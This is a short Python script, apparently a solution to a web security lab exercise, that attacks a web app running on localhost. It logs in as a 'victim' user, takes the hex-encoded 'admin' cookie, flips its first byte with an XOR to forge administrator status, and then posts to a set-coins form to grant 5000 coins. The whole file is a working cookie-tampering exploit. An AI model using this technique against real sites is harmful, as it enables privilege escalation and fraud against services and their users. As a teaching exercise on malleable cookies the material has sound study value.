from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  #you'll need to change this to a non-admin user, such as 'victim'.
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here

	print(sess.cookies)
	# obtain hex admin cookie
	admin_hex_cookie = sess.cookies.get('admin')
	
	# convert Hex cookie to byte
	admin_byte_cookie = bytearray.fromhex(admin_hex_cookie)

	# XOR operator to flip the none admin byte 0x00 to admin byte 0x01
	admin_byte_cookie[0] ^= 1

	# set Mauled cookie to admin cookie
	cookies = sess.cookies
	cookies.set(
		"admin",
		admin_byte_cookie.hex(),
		domain=cookies.list_domains()[0],
		path=cookies.list_paths()[0]
	)

	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
